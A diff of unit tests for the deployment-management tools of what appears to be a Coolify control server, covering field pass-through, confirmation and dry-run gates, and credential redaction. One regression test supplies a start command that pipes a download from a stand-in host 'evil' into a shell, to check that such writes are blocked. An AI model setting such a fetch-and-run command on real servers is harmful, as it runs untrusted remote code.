@@ -553,16 +553,76 @@ describe("create_resource", () => {
     expect(result.status).toBe("ok");
     expect((result as Record<string, unknown>).uuid).toBe("newapp1");
   });
+
+  it("declares build_pack and the fields pass-through in the input schema", () => {
+    const tool = findTool("create_resource");
+    const schema = tool.inputSchema as {
+      properties?: Record<string, { type?: string; enum?: string[]; additionalProperties?: boolean }>;
+    };
+    expect(schema.properties?.build_pack?.type).toBe("string");
+    expect(schema.properties?.build_pack?.enum).toEqual(
+      expect.arrayContaining(["nixpacks", "static", "dockerfile", "dockercompose"]),
+    );
+    expect(schema.properties?.fields?.type).toBe("object");
+    expect(schema.properties?.fields?.additionalProperties).toBe(true);
+    expect(schema.properties?.fields_json?.type).toBe("string");
+  });
+
+  it("merges `fields` into the application create body", async () => {
+    const ctx = makeDestructiveCtxBase();
+    (ctx.api.applications.createPublic as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ uuid: "newapp2" });
+    const tool = findTool("create_resource");
+    const result = await tool.handler(
+      {
+        kind: "application", source: "public",
+        server_uuid: "srv1", environment_name: "production", project_uuid: "proj1",
+        git_repository: "https://github.com/user/repo", git_branch: "main", name: "myapp",
+        build_pack: "nixpacks",
+        fields: { ports_exposes: "3000", base_directory: "/apps/web" },
+        confirm: true,
+      },
+      ctx,
+    );
+    expect(result.status).toBe("ok");
+    expect(ctx.api.applications.createPublic).toHaveBeenCalledWith(
+      expect.objectContaining({
+        build_pack: "nixpacks",
+        ports_exposes: "3000",
+        base_directory: "/apps/web",
+        name: "myapp",
+      }),
+    );
+  });
+
+  it("merges `fields` into the database create body", async () => {
+    const ctx = makeDestructiveCtxBase();
+    (ctx.api.databases.create as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ uuid: "newdb1" });
+    const tool = findTool("create_resource");
+    const result = await tool.handler(
+      {
+        kind: "database", engine: "postgresql",
+        server_uuid: "srv1", environment_name: "production", project_uuid: "proj1",
+        fields: { postgres_user: "admin", is_public: false },
+        confirm: true,
+      },
+      ctx,
+    );
+    expect(result.status).toBe("ok");
+    expect(ctx.api.databases.create).toHaveBeenCalledWith(
+      "postgresql",
+      expect.objectContaining({ postgres_user: "admin", is_public: false }),
+    );
+  });
 });
 
 describe("update_resource", () => {
   it("updates an application", async () => {
-    const ctx = makeCtx();
+    const ctx = makeDestructiveCtxBase();
     (ctx.api.applications.update as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ uuid: "abc123", name: "renamed-app" });
 
     const tool = findTool("update_resource");
     const result = await tool.handler(
-      { type: "applications", uuid: "abc123", name: "renamed-app" },
+      { type: "applications", uuid: "abc123", name: "renamed-app", confirm: true },
       ctx,
     );
 
@@ -573,12 +633,12 @@ describe("update_resource", () => {
   });
 
   it("updates a database", async () => {
-    const ctx = makeCtx();
+    const ctx = makeDestructiveCtxBase();
     (ctx.api.databases.update as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ uuid: "def456", name: "renamed-db" });
 
     const tool = findTool("update_resource");
     const result = await tool.handler(
-      { type: "databases", uuid: "def456", name: "renamed-db" },
+      { type: "databases", uuid: "def456", name: "renamed-db", confirm: true },
       ctx,
     );
 
@@ -587,17 +647,244 @@ describe("update_resource", () => {
   });
 
   it("updates a service", async () => {
-    const ctx = makeCtx();
+    const ctx = makeDestructiveCtxBase();
     (ctx.api.services.update as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ uuid: "ghi789", name: "renamed-svc" });
 
     const tool = findTool("update_resource");
     const result = await tool.handler(
-      { type: "services", uuid: "ghi789", name: "renamed-svc" },
+      { type: "services", uuid: "ghi789", name: "renamed-svc", confirm: true },
       ctx,
     );
 
     expect(result.status).toBe("ok");
     expect(ctx.api.services.update).toHaveBeenCalledWith("ghi789", { name: "renamed-svc" });
+  });
+
+  it("unwraps the declared `fields` object into the update body", async () => {
+    const ctx = makeDestructiveCtxBase();
+    (ctx.api.applications.update as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ uuid: "abc123" });
+
+    const tool = findTool("update_resource");
+    const result = await tool.handler(
+      {
+        type: "applications",
+        uuid: "abc123",
+        fields: { post_deployment_command: "php artisan migrate", ports_exposes: "8080" },
+        confirm: true,
+      },
+      ctx,
+    );
+
+    expect(result.status).toBe("ok");
+    expect(ctx.api.applications.update).toHaveBeenCalledWith("abc123", {
+      post_deployment_command: "php artisan migrate",
+      ports_exposes: "8080",
+    });
+  });
+
+  it("merges top-level extras with `fields`, fields winning on conflict", async () => {
+    const ctx = makeDestructiveCtxBase();
+    (ctx.api.applications.update as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ uuid: "abc123" });
+
+    const tool = findTool("update_resource");
+    const result = await tool.handler(
+      { type: "applications", uuid: "abc123", name: "top-level", fields: { name: "from-fields", start_command: "npm start" }, confirm: true },
+      ctx,
+    );
+
+    expect(result.status).toBe("ok");
+    expect(ctx.api.applications.update).toHaveBeenCalledWith("abc123", {
+      name: "from-fields",
+      start_command: "npm start",
+    });
+  });
+
+  it("accepts empty `fields` when top-level extras populate the body", async () => {
+    const ctx = makeDestructiveCtxBase();
+    (ctx.api.applications.update as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ uuid: "abc123", name: "renamed" });
+
+    const tool = findTool("update_resource");
+    const result = await tool.handler(
+      { type: "applications", uuid: "abc123", fields: {}, name: "renamed", confirm: true },
+      ctx,
+    );
+
+    expect(result.status).toBe("ok");
+    expect(ctx.api.applications.update).toHaveBeenCalledWith("abc123", { name: "renamed" });
+  });
+
+  it("accepts `fields_json` as a JSON-encoded alternative to `fields`", async () => {
+    const ctx = makeDestructiveCtxBase();
+    (ctx.api.applications.update as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ uuid: "abc123" });
+
+    const tool = findTool("update_resource");
+    const result = await tool.handler(
+      {
+        type: "applications",
+        uuid: "abc123",
+        fields_json: '{"start_command":"npm start","health_check_enabled":true,"health_check_retries":3}',
+        confirm: true,
+      },
+      ctx,
+    );
+
+    expect(result.status).toBe("ok");
+    expect(ctx.api.applications.update).toHaveBeenCalledWith("abc123", {
+      start_command: "npm start",
+      health_check_enabled: true,
+      health_check_retries: 3,
+    });
+  });
+
+  it("returns invalid_input for malformed `fields_json`", async () => {
+    const ctx = makeDestructiveCtxBase();
+    const tool = findTool("update_resource");
+
+    for (const fields_json of ["{not json", '"a string"', "[1,2]", "null", 42]) {
+      const result = await tool.handler(
+        { type: "applications", uuid: "abc123", fields_json, confirm: true },
+        ctx,
+      );
+      expect(result.status).toBe("error");
+      const r = result as Record<string, unknown>;
+      expect((r.error as Record<string, unknown>).kind).toBe("invalid_input");
+    }
+    expect(ctx.api.applications.update).not.toHaveBeenCalled();
+  });
+
+  it("returns invalid_input when both `fields` and `fields_json` are provided", async () => {
+    const ctx = makeDestructiveCtxBase();
+    const tool = findTool("update_resource");
+    const result = await tool.handler(
+      { type: "applications", uuid: "abc123", fields: { name: "a" }, fields_json: '{"name":"b"}', confirm: true },
+      ctx,
+    );
+    expect(result.status).toBe("error");
+    expect(((result as Record<string, unknown>).error as Record<string, unknown>).kind).toBe("invalid_input");
+    expect(ctx.api.applications.update).not.toHaveBeenCalled();
+  });
+
+  it("remaps `fqdn` to `domains` for applications (Coolify rejects fqdn in PATCH)", async () => {
+    const ctx = makeDestructiveCtxBase();
+    (ctx.api.applications.update as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ uuid: "abc123" });
+
+    const tool = findTool("update_resource");
+    const result = await tool.handler(
+      { type: "applications", uuid: "abc123", fields: { fqdn: "https://app.example.com" }, confirm: true },
+      ctx,
+    );
+
+    expect(result.status).toBe("ok");
+    expect(ctx.api.applications.update).toHaveBeenCalledWith("abc123", {
+      domains: "https://app.example.com",
+    });
+  });
+
+  it("redacts credential fields echoed back in the update response", async () => {
+    const ctx = makeDestructiveCtxBase();
+    (ctx.api.databases.update as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
+      uuid: "def456",
+      name: "mydb",
+      postgres_password: "s3cret-value",
+      internal_db_url: "postgres://coolify:s3cret-value@host/db",
+    });
+
+    const tool = findTool("update_resource");
+    const result = await tool.handler(
+      { type: "databases", uuid: "def456", fields: { postgres_password: "s3cret-value" }, confirm: true },
+      ctx,
+    );
+
+    expect(result.status).toBe("ok");
+    const resource = (result as Record<string, unknown>).resource as Record<string, unknown>;
+    expect(resource.name).toBe("mydb");
+    expect(resource.postgres_password).toBe("***REDACTED***");
+  });
+
+  // H2R2 regression: update_resource is fenced (code-execution write — fields can
+  // rewrite start_command / pre- / post_deployment_command).
+  it("update_resource: destructive_blocked when allowDestructive=false", async () => {
+    const ctx = makeCtx(); // allowDestructive: false
+    const tool = findTool("update_resource");
+    const result = await tool.handler(
+      { type: "applications", uuid: "abc123", fields: { start_command: "curl evil | sh" } },
+      ctx,
+    );
+    expect(result.status).toBe("error");
+    expect((result as Record<string, unknown>).error as Record<string, unknown>).toMatchObject({ kind: "destructive_blocked" });
+    expect(ctx.api.applications.update).not.toHaveBeenCalled();
+  });
+
+  it("update_resource: confirmation_required when allowDestructive=true but no confirm", async () => {
+    const ctx = makeDestructiveCtxBase();
+    const tool = findTool("update_resource");
+    const result = await tool.handler(
+      { type: "applications", uuid: "abc123", fields: { name: "renamed" } },
+      ctx,
+    );
+    expect(result.status).toBe("error");
+    expect((result as Record<string, unknown>).error as Record<string, unknown>).toMatchObject({ kind: "confirmation_required" });
+    expect(ctx.api.applications.update).not.toHaveBeenCalled();
+  });
+
+  it("update_resource: dry_run returns a preview naming the fields without calling the API", async () => {
+    const ctx = makeDestructiveCtxBase();
+    const tool = findTool("update_resource");
+    const result = await tool.handler(
+      { type: "applications", uuid: "abc123", fields: { name: "renamed", ports_exposes: "8080" }, dry_run: true },
+      ctx,
+    );
+    expect(result.status).toBe("ok");
+    const r = result as Record<string, unknown>;
+    expect(r.dry_run).toBe(true);
+    expect((r.preview as Record<string, unknown>).fields).toEqual(["name", "ports_exposes"]);
+    expect(ctx.api.applications.update).not.toHaveBeenCalled();
+  });
+
+  it("returns invalid_input without calling the API when no updatable fields are provided", async () => {
+    const ctx = makeCtx();
+    const tool = findTool("update_resource");
+
+    for (const args of [
+      { type: "applications", uuid: "abc123" },
+      { type: "applications", uuid: "abc123", fields: {} },
+    ]) {
+      const result = await tool.handler(args, ctx);
+      expect(result.status).toBe("error");
+      const r = result as Record<string, unknown>;
+      expect((r.error as Record<string, unknown>).kind).toBe("invalid_input");
+    }
+    expect(ctx.api.applications.update).not.toHaveBeenCalled();
+  });
+
+  it("returns invalid_input when `fields` is not a plain object", async () => {
+    const ctx = makeCtx();
+    const tool = findTool("update_resource");
+
+    for (const fields of ["not-an-object", 42, ["a"], null]) {
+      const result = await tool.handler(
+        { type: "applications", uuid: "abc123", fields },
+        ctx,
+      );
+      expect(result.status).toBe("error");
+      const r = result as Record<string, unknown>;
+      expect((r.error as Record<string, unknown>).kind).toBe("invalid_input");
+    }
+    expect(ctx.api.applications.update).not.toHaveBeenCalled();
+  });
+
+  it("declares `fields`, `fields_json`, `confirm`, and `dry_run` in the input schema", () => {
+    const tool = findTool("update_resource");
+    const schema = tool.inputSchema as {
+      properties?: Record<string, { type?: string; additionalProperties?: boolean }>;
+    };
+    const fields = schema.properties?.fields;
+    expect(fields).toBeDefined();
+    expect(fields?.type).toBe("object");
+    expect(fields?.additionalProperties).toBe(true);
+    expect(schema.properties?.fields_json?.type).toBe("string");
+    expect(schema.properties?.confirm?.type).toBe("boolean");
+    expect(schema.properties?.dry_run?.type).toBe("boolean");
   });
 
   it("returns invalid_input for unknown type", async () => {
@@ -1006,6 +1293,72 @@ describe("manage_storage", () => {
     expect(result.status).toBe("ok");
   });
 
+  it("creates storage from the declared `fields` object", async () => {
+    const ctx = makeDestructiveCtx();
+    (ctx.api.applications.createStorage as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ uuid: "st4" });
+
+    const tool = findTool("manage_storage");
+    const result = await tool.handler(
+      {
+        type: "applications", uuid: "abc123", action: "create",
+        fields: { name: "myvolume", mount_path: "/data", is_directory: true },
+      },
+      ctx,
+    );
+
+    expect(result.status).toBe("ok");
+    expect(ctx.api.applications.createStorage).toHaveBeenCalledWith("abc123", {
+      name: "myvolume",
+      mount_path: "/data",
+      is_directory: true,
+    });
+  });
+
+  it("updates storage from the declared `fields` object", async () => {
+    const ctx = makeDestructiveCtx();
+    (ctx.api.applications.updateStorage as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ uuid: "st1" });
+
+    const tool = findTool("manage_storage");
+    const result = await tool.handler(
+      {
+        type: "applications", uuid: "abc123", action: "update", storage_uuid: "st1",
+        fields: { mount_path: "/newdata" },
+      },
+      ctx,
+    );
+
+    expect(result.status).toBe("ok");
+    expect(ctx.api.applications.updateStorage).toHaveBeenCalledWith("abc123", "st1", {
+      mount_path: "/newdata",
+    });
+  });
+
+  it("returns invalid_input when create/update has no storage fields", async () => {
+    const ctx = makeDestructiveCtx();
+    const tool = findTool("manage_storage");
+
+    for (const args of [
+      { type: "applications", uuid: "abc123", action: "create" },
+      { type: "applications", uuid: "abc123", action: "update", storage_uuid: "st1", fields: {} },
+    ]) {
+      const result = await tool.handler(args, ctx);
+      expect(result.status).toBe("error");
+      expect(((result as Record<string, unknown>).error as Record<string, unknown>).kind).toBe("invalid_input");
+    }
+    expect(ctx.api.applications.createStorage).not.toHaveBeenCalled();
+    expect(ctx.api.applications.updateStorage).not.toHaveBeenCalled();
+  });
+
+  it("declares `fields` and `fields_json` in the manage_storage input schema", () => {
+    const tool = findTool("manage_storage");
+    const schema = tool.inputSchema as {
+      properties?: Record<string, { type?: string; additionalProperties?: boolean }>;
+    };
+    expect(schema.properties?.fields?.type).toBe("object");
+    expect(schema.properties?.fields?.additionalProperties).toBe(true);
+    expect(schema.properties?.fields_json?.type).toBe("string");
+  });
+
   it("blocks delete-storage without confirm when allowDestructive=true", async () => {
     const ctx = makeDestructiveCtx();
     const tool = findTool("manage_storage");
@@ -1075,17 +1428,75 @@ describe("manage_backups", () => {
     expect(Array.isArray((result as Record<string, unknown>).backups)).toBe(true);
   });
 
-  it("creates a backup", async () => {
+  it("creates a backup from the declared `fields` object", async () => {
     const ctx = makeDestructiveCtx();
     (ctx.api.databases.createBackup as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ uuid: "bk2" });
 
     const tool = findTool("manage_backups");
     const result = await tool.handler(
-      { uuid: "def456", action: "create" },
+      { uuid: "def456", action: "create", fields: { frequency: "0 3 * * *", save_s3: false } },
       ctx,
     );
 
     expect(result.status).toBe("ok");
+    expect(ctx.api.databases.createBackup).toHaveBeenCalledWith("def456", {
+      frequency: "0 3 * * *",
+      save_s3: false,
+    });
+  });
+
+  it("creates a backup from top-level extras (permissive-client path)", async () => {
+    const ctx = makeDestructiveCtx();
+    (ctx.api.databases.createBackup as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ uuid: "bk2" });
+
+    const tool = findTool("manage_backups");
+    const result = await tool.handler(
+      { uuid: "def456", action: "create", frequency: "0 3 * * *" },
+      ctx,
+    );
+
+    expect(result.status).toBe("ok");
+    expect(ctx.api.databases.createBackup).toHaveBeenCalledWith("def456", { frequency: "0 3 * * *" });
+  });
+
+  it("updates a backup from the declared `fields` object", async () => {
+    const ctx = makeDestructiveCtx();
+    (ctx.api.databases.updateBackup as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ uuid: "bk1" });
+
+    const tool = findTool("manage_backups");
+    const result = await tool.handler(
+      { uuid: "def456", action: "update", backup_uuid: "bk1", fields: { enabled: false } },
+      ctx,
+    );
+
+    expect(result.status).toBe("ok");
+    expect(ctx.api.databases.updateBackup).toHaveBeenCalledWith("def456", "bk1", { enabled: false });
+  });
+
+  it("returns invalid_input when backup create/update has no fields", async () => {
+    const ctx = makeDestructiveCtx();
+    const tool = findTool("manage_backups");
+
+    for (const args of [
+      { uuid: "def456", action: "create" },
+      { uuid: "def456", action: "update", backup_uuid: "bk1" },
+    ]) {
+      const result = await tool.handler(args, ctx);
+      expect(result.status).toBe("error");
+      expect(((result as Record<string, unknown>).error as Record<string, unknown>).kind).toBe("invalid_input");
+    }
+    expect(ctx.api.databases.createBackup).not.toHaveBeenCalled();
+    expect(ctx.api.databases.updateBackup).not.toHaveBeenCalled();
+  });
+
+  it("declares `fields` and `fields_json` in the manage_backups input schema", () => {
+    const tool = findTool("manage_backups");
+    const schema = tool.inputSchema as {
+      properties?: Record<string, { type?: string; additionalProperties?: boolean }>;
+    };
+    expect(schema.properties?.fields?.type).toBe("object");
+    expect(schema.properties?.fields?.additionalProperties).toBe(true);
+    expect(schema.properties?.fields_json?.type).toBe("string");
   });
 
   it("blocks delete-backup without confirm", async () => {
@@ -1156,6 +1567,32 @@ describe("manage_scheduled_tasks", () => {
     expect(ctx.api.applications.createScheduledTask).toHaveBeenCalledWith(
       "abc123",
       expect.objectContaining({ name: "nightly", command: "npm run cleanup" }),
+    );
+  });
+
+  it("declares container, timeout, and enabled in the input schema and forwards them", async () => {
+    const tool = findTool("manage_scheduled_tasks");
+    const schema = tool.inputSchema as {
+      properties?: Record<string, { type?: string }>;
+    };
+    expect(schema.properties?.container?.type).toBe("string");
+    expect(schema.properties?.timeout?.type).toBe("integer");
+    expect(schema.properties?.enabled?.type).toBe("boolean");
+
+    const ctx = makeDestructiveCtx();
+    (ctx.api.services.createScheduledTask as ReturnType<typeof vi.fn>).mockResolvedValueOnce({ uuid: "task3" });
+    const result = await tool.handler(
+      {
+        type: "services", uuid: "svc123", action: "create",
+        name: "prune", command: "docker system prune -f", frequency: "0 4 * * *",
+        container: "worker", timeout: 600, enabled: false, confirm: true,
+      },
+      ctx,
+    );
+    expect(result.status).toBe("ok");
+    expect(ctx.api.services.createScheduledTask).toHaveBeenCalledWith(
+      "svc123",
+      expect.objectContaining({ container: "worker", timeout: 600, enabled: false }),
     );
   });
 
